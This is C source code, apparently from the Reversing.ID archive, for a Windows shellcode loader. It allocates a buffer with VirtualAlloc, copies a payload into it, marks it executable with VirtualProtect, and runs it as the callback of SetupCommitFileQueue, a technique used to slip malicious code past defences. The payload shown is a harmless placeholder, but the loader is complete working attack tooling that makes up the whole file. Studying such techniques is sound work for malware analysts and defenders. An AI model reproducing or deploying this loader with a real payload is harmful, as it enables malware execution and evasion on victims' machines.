/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  SetupCommitFileQueue
*/

#include <windows.h>
#include <stdint.h>
#include <setupapi.h>

#pragma comment(lib,"setupapi")
#pragma comment(lib,"user32")

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HSPFILEQ queue;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        queue = SetupOpenFileQueue();
        SetupQueueCopy (queue, "C:\\", "\\Windows\\System32\\", "kernel32.dll", NULL, NULL, "C:\\Windows\\temp\\", "kernel32.dll", SP_COPY_NOSKIP); 
        SetupCommitFileQueue (GetTopWindow(NULL), queue, (PSP_FILE_CALLBACK_A)runtime, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}